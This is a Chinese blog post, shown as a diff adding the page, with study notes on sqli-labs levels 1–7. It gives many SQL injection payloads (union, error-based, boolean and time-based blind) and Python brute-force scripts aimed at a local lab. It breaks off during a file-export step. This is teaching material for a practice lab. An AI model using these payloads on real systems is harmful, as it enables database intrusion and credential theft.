@@ -1,0 +1,260 @@
+<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Sqli-Labs笔记-basic"><meta name="keywords" content="Web,Sql注入"><meta name="author" content="Gard3nia"><meta name="copyright" content="Gard3nia"><title>Sqli-Labs笔记-basic | Gard3nia's Blog</title><link rel="shortcut icon" href="/rea.jpg"><link rel="stylesheet" href="/css/index.css?version=1.5.6"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.5.6"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  }
+} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#less-1"><span class="toc-number">2.1.</span> <span class="toc-text">less-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-2"><span class="toc-number">2.2.</span> <span class="toc-text">less-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-3"><span class="toc-number">2.3.</span> <span class="toc-text">less-3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-4"><span class="toc-number">2.4.</span> <span class="toc-text">less-4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结1"><span class="toc-number">2.5.</span> <span class="toc-text">小结1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-5-盲注-单引号"><span class="toc-number">2.6.</span> <span class="toc-text">less-5(盲注-单引号)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#solution1-构造逻辑判断"><span class="toc-number">2.6.1.</span> <span class="toc-text">solution1(构造逻辑判断)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution2-concat函数报错注入"><span class="toc-number">2.6.2.</span> <span class="toc-text">solution2(concat函数报错注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution3-xpath函数报错注入"><span class="toc-number">2.6.3.</span> <span class="toc-text">solution3(xpath函数报错注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml"><span class="toc-number">2.6.3.1.</span> <span class="toc-text">updatexml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue"><span class="toc-number">2.6.3.2.</span> <span class="toc-text">extractvalue</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution4-bigint溢出报错注入"><span class="toc-number">2.6.4.</span> <span class="toc-text">solution4(bigint溢出报错注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#soultion5-double类型溢出报错"><span class="toc-number">2.6.5.</span> <span class="toc-text">soultion5(double类型溢出报错)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution6-利用数据的重复性报错"><span class="toc-number">2.6.6.</span> <span class="toc-text">solution6(利用数据的重复性报错)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution7-延时注入"><span class="toc-number">2.6.7.</span> <span class="toc-text">solution7(延时注入)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-6-盲注-双引号"><span class="toc-number">2.7.</span> <span class="toc-text">less-6(盲注-双引号)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-7-文件导入导出"><span class="toc-number">2.8.</span> <span class="toc-text">less-7(文件导入导出)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#First"><span class="toc-number">2.8.1.</span> <span class="toc-text">First</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Second"><span class="toc-number">2.8.2.</span> <span class="toc-text">Second</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解决方法"><span class="toc-number">2.8.3.</span> <span class="toc-text">解决方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-写入木马"><span class="toc-number">2.8.3.1.</span> <span class="toc-text">1.写入木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-导出文件"><span class="toc-number">2.8.3.2.</span> <span class="toc-text">2. 导出文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-8-bool盲注"><span class="toc-number">2.9.</span> <span class="toc-text">less-8(bool盲注)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-9-时间盲注-单引号"><span class="toc-number">2.10.</span> <span class="toc-text">less-9(时间盲注-单引号)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-10-时间盲注-双引号"><span class="toc-number">2.11.</span> <span class="toc-text">less-10(时间盲注-双引号)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结2"><span class="toc-number">2.12.</span> <span class="toc-text">小结2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-11-Post注入"><span class="toc-number">2.13.</span> <span class="toc-text">less-11(Post注入)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-12"><span class="toc-number">2.14.</span> <span class="toc-text">less-12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-13"><span class="toc-number">2.15.</span> <span class="toc-text">less-13</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#solution1-concat报错"><span class="toc-number">2.15.1.</span> <span class="toc-text">solution1(concat报错)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution2-逻辑判断"><span class="toc-number">2.15.2.</span> <span class="toc-text">solution2(逻辑判断)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-14"><span class="toc-number">2.16.</span> <span class="toc-text">less-14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-15"><span class="toc-number">2.17.</span> <span class="toc-text">less-15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-16"><span class="toc-number">2.18.</span> <span class="toc-text">less-16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结3"><span class="toc-number">2.19.</span> <span class="toc-text">小结3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-17"><span class="toc-number">2.20.</span> <span class="toc-text">less-17</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Gard3nia</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">27</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">12</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">4</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">friendlinks</div><a class="author-info-links__name text-center" href="https://skysec.top">一叶飘零学长</a><a class="author-info-links__name text-center" href="https://0verwatch.top/">0verwatch</a><a class="author-info-links__name text-center" href="https://comydream.github.io">Source</a><a class="author-info-links__name text-center" href="http://chaosec.top/">Charles</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://s1.ax1x.com/2018/12/27/FRVGCQ.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Gard3nia's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">时间轴</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">归档</a><a class="site-page" href="/about">简介</a></span></div><div id="post-info"><div id="post-title">Sqli-Labs笔记-basic</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-04-03</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Web安全学习笔记/">Web安全学习笔记</a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">4k</span><span class="post-meta__separator">|</span><span>Reading time: 17 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Sqli-labs初体验~<a id="more"></a></p>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p> 是一个简答的字符型注入，GET传参<code>id=1‘</code>，发现报错：</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL<br>server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>既然报错了就很简单了，直接注释掉后面的引号：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27--+</span><br></pre></td></tr></table></figure>
+<p>回显正常，说明确实是字符型注入，接下来就是用<code>order by</code>查询当前表有几个字段；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27 order by 3--+</span><br></pre></td></tr></table></figure>
+<p>到3列为止没有任何问题，到4为止就报错：</p>
+<blockquote>
+<p>Unknown column ‘4’ in ‘order clause’</p>
+</blockquote>
+<p>说明只有3列，那就可以直接用<code>union select</code>进行查询了，这里需要将union select前面的查询语句置空，这样的话，查询的结果就都是union select之后的查询内容了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+<p>这里的回显结果为2和3，这样的话我们可以直接利用这两个位置进行回显自己想要的数据，得到数据库名和数据库用户名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,database(),user()--+</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Your Login name:security<br>Your Password:root@localhost</p>
+</blockquote>
+<p>接下来就是使用系统数据库的一些表单进行更深入的查询了，一般的顺序就是：<code>爆库-&gt;爆表-&gt;爆列-&gt;爆数据</code>；其实到上述为止已经爆库了；</p>
+<p>接下来是用系统数据库进行查询的一系列步骤：</p>
+<ol>
+<li><p>爆库名（此处爆的是mysql中所有的数据库，而database()只能做到查询到当前库的名字）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Your Login name:information_schema,challenges,mysql,performance_schema,security<br>Your Password:3</p>
+</blockquote>
+</li>
+<li><p>爆表名（information_schema数据库里的tables表里的table_name和table_schema列）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;security&apos;--+</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Your Login name:emails,referers,uagents,users<br>Your Password:3</p>
+</blockquote>
+</li>
+<li><p>爆列名（information_schema数据库里的columns表里的column列）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;--+</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Your Login name:id,username,password<br>Your Password:3</p>
+</blockquote>
+</li>
+<li><p>爆数值（知道了所有的信息：库名，表名，列名，列出合格的查询语句即可）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4<br>Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</p>
+</blockquote>
+</li>
+</ol>
+<h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>尝试<code>?id=1‘</code>，<code>?id=1&#39;--+</code>发现全都报错，猜测是数字型注入；</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
+<p>发现确实是数字型注入，然后重复less-1的操作即可；</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+<h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>尝试<code>?id=1&#39;</code>，<code>?id=1&#39;--+</code>都报错</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the<br>manual that corresponds to your MySQL server version for the right<br>syntax to use near ‘’1’’) LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>尝试<code>?id=1&#39;)--+</code>成功回显，查看源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
+<p>果然是需要闭合一个引号和括号，接下来就是和less-1一样的操作；</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&apos;) union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+<h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>查看源代码，在$id左右加上双引号和括号：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = &apos;&quot;&apos; . $id . &apos;&quot;&apos;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+<h2 id="小结1"><a href="#小结1" class="headerlink" title="小结1"></a>小结1</h2><p>这部分的注入非常基础和简单，只要熟悉<code>mysql</code>中的<code>information_schema</code>数据库，善于利用<code>order by</code>去查询列数，然后直接用<code>information_schema</code>数据库里的数据表去结合<code>union select</code>查询就好；</p>
+<h2 id="less-5-盲注-单引号"><a href="#less-5-盲注-单引号" class="headerlink" title="less-5(盲注-单引号)"></a>less-5(盲注-单引号)</h2><p>从这里开始就需要使用到sql盲注的知识了，先介绍几个需要用到的常用的函数：</p>
+<blockquote>
+<p>left(a,b) //从左开始截取a的前b位</p>
+<p>ascii() //将单个字符转换为ASCII码</p>
+<p>substr(str,pos,len) //将str字符串截断，从pos位开始取len个字符（开始为1）</p>
+<p>length() //返回字符串的长度</p>
+<p>sleep(n) //将程序挂起一段时间，n为n秒</p>
+<p>if(a,b,c) //如果a=true，则执行b，否则执行c</p>
+</blockquote>
+<p>这里输入<code>?id=1&#39;</code>发现报错，直接注释掉后面的语句<code>?id=1&#39;--+</code>，回显<code>You are in...........</code>；由此得到此题为盲注的类型，直接查询肯定是看不到的，但是可以判断输入的查询语句的结果是否为真，这样的话就可以使用盲注的思路来解决此题：</p>
+<h3 id="solution1-构造逻辑判断"><a href="#solution1-构造逻辑判断" class="headerlink" title="solution1(构造逻辑判断)"></a>solution1(构造逻辑判断)</h3><p>先测试数据库的名字（此处省去二分查找的过程）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr(database(),1,1))=115--+</span><br></pre></td></tr></table></figure>
+<p>回显：<code>You are in...........</code>所以数据库的名字的第一个字母为s，接下来再次测试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr(database(),2,1))=101--+</span><br></pre></td></tr></table></figure>
+<p>得到数据库名字的第二个字母为e，所以接下来就按照这种方法去测试下面的几个字母就可以很容易的得到数据库的名字，这里就不一一去尝试了，贴上爆破脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://127.0.0.1/sqli-labs/sqli-labs-master/Less-5/?id=1' and ascii(substr(database(),&#123;len&#125;,1))=&#123;ascii&#125;--+"</span></span><br><span class="line">database_name=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">		url_now=url.format(len=i,ascii=j)</span><br><span class="line">		r=requests.get(url_now)</span><br><span class="line">		r.encoding=r.apparent_encoding</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			database_name+=chr(j)</span><br><span class="line"><span class="keyword">print</span> database_name</span><br></pre></td></tr></table></figure>
+<p>得到库名：security，用此方法即可推出表名和列名，只是暴力破解需要时间，慢慢爆破是肯定可以的,给出<strong>payload：</strong><code>?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101--+</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://127.0.0.1/sqli-labs/sqli-labs-master/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),&#123;len&#125;,1))=&#123;ascii&#125; --+"</span></span><br><span class="line">table_name=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">		url_now=url.format(len=i,ascii=j)</span><br><span class="line">		r=requests.get(url_now)</span><br><span class="line">		r.encoding=r.apparent_encoding</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			table_name+=chr(j)</span><br><span class="line">			<span class="keyword">print</span> table_name</span><br></pre></td></tr></table></figure>
+<p>爆破出表名：</p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxfRDU.png" alt="kxfRDU.png"></p>
+<p>总的来说，这个方法的主要思路就是：在构造数据库查询语句结果为true和false的时候回显页面不一样，这样的话就可以通过构造逻辑判断的方法来一个个猜测字段的名称，从而达到获取敏感信息的目的；</p>
+<h3 id="solution2-concat函数报错注入"><a href="#solution2-concat函数报错注入" class="headerlink" title="solution2(concat函数报错注入)"></a>solution2(concat函数报错注入)</h3><p>基于concat报错的注入时，利用的是MySQL的一个bug，rand()值不固定，需要多试几次(固定格式，换掉检索内容即可，报错内容和原因有待研究…)</p>
+<p>爆库payload1：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1%27%20union%20select%201,count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))a%20from%20information_schema.tables%20group%20by%20a--+</span><br></pre></td></tr></table></figure>
+<p>得到本数据库名称：</p>
+<blockquote>
+<p>Duplicate entry ‘::security::1’ for key ‘group_key’</p>
+</blockquote>
+<p>爆表payload2：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 3,1),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>
+<p>得到关键数据表名称：</p>
+<blockquote>
+<p>Duplicate entry ‘::users::0’ for key ‘group_key’</p>
+</blockquote>
+<p>爆列payload3：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>
+<p>得到关键列名：</p>
+<blockquote>
+<p>Duplicate entry ‘::username::0’ for key ‘group_key’</p>
+<p>Duplicate entry ‘::password::0’ for key ‘group_key’</p>
+</blockquote>
+<p>爆数据payload4：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select username from users limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select password from users limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>
+<p>只能通过控制limit的数值查看不同的行数，不可以用group_concat，得到结果：</p>
+<blockquote>
+<p>Duplicate entry ‘::Angelina::1’ for key ‘group_key’</p>
+<p>Duplicate entry ‘::I-kill-you::0’ for key ‘group_key’</p>
+</blockquote>
+<h3 id="solution3-xpath函数报错注入"><a href="#solution3-xpath函数报错注入" class="headerlink" title="solution3(xpath函数报错注入)"></a>solution3(xpath函数报错注入)</h3><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><p>爆库：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select database() limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+<p>爆表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+<p>爆列：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns  where table_name=&apos;users&apos; limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+<p>爆值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select username from users limit 2,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select password from users limit 2,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+<p>得到关键信息：</p>
+<blockquote>
+<p>XPATH syntax error: ‘~Dummy~’</p>
+<p>XPATH syntax error: ‘~p@ssword~’</p>
+</blockquote>
+<p>调整limit参数即可查询不同的行信息；</p>
+<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h4><p>和updatexml一样，继续注入即可，不再赘述……</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and extractvalue(1,concat(0x7e,(payload),0x7e))--+</span><br></pre></td></tr></table></figure>
+<h3 id="solution4-bigint溢出报错注入"><a href="#solution4-bigint溢出报错注入" class="headerlink" title="solution4(bigint溢出报错注入)"></a>solution4(bigint溢出报错注入)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select (!(select * from (select user())x) - ~0),2,3--+</span><br></pre></td></tr></table></figure>
+<p>暂未成功，待更……</p>
+<h3 id="soultion5-double类型溢出报错"><a href="#soultion5-double类型溢出报错" class="headerlink" title="soultion5(double类型溢出报错)"></a>soultion5(double类型溢出报错)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select (exp(~(select * FROM(SELECT USER())a))),2,3--+</span><br></pre></td></tr></table></figure>
+<p>暂未成功，待更……</p>
+<h3 id="solution6-利用数据的重复性报错"><a href="#solution6-利用数据的重复性报错" class="headerlink" title="solution6(利用数据的重复性报错)"></a>solution6(利用数据的重复性报错)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+</span><br></pre></td></tr></table></figure>
+<p>暂未成功，只能注出mysql版本，待更……</p>
+<h3 id="solution7-延时注入"><a href="#solution7-延时注入" class="headerlink" title="solution7(延时注入)"></a>solution7(延时注入)</h3><p>如果第一个判断为true，则立即返回，若为flase，则会有5秒的延时，后面基本就和solution1一致，不再赘述；给出payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
+<h2 id="less-6-盲注-双引号"><a href="#less-6-盲注-双引号" class="headerlink" title="less-6(盲注-双引号)"></a>less-6(盲注-双引号)</h2><p>除了是双引号闭合，其他和less-5一样，不再赘述……</p>
+<h2 id="less-7-文件导入导出"><a href="#less-7-文件导入导出" class="headerlink" title="less-7(文件导入导出)"></a>less-7(文件导入导出)</h2><p>尝试<code>id=1&#39;</code>报错，<code>id=1&#39;--+</code>依然报错，<code>id=1&quot;</code>不报错，那方向还是在单引号上，查看源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
+<p>发现可以构造<code>id=1&#39;))</code>进行闭合，这里有一个小技巧，就是如何判断是否需要闭合括号，尝试<code>id=1&#39; and 1=1--+</code>，注释以后任然报错，说明是有括号的，逐个加括号测试即可；</p>
+<p>然后就是进行数据库导出文件，尝试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;)) union select * from users into outfile &quot;D:\\1.txt&quot;--+</span><br></pre></td></tr></table></figure>
+<p>发现mysql报错，指定路径下也没有该文件，可能原因如下：</p>
+<h3 id="First"><a href="#First" class="headerlink" title="First"></a>First</h3><p>猜想：可能是权限不够，需要root权限才可以对数据库进行读写，用以下语句测试权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;)) and (select count(*) from mysql.user)&gt;0--+</span><br></pre></td></tr></table></figure>
+<p>回显正常，说明不是权限不够的问题；</p>
+<h3 id="Second"><a href="#Second" class="headerlink" title="Second"></a>Second</h3><p>猜想：可能是需要在指定的目录下进行数据的导出操作，<code>secure_file_priv</code>这个参数用来限制数据导入和导出操作的效果，先查看一下</p>
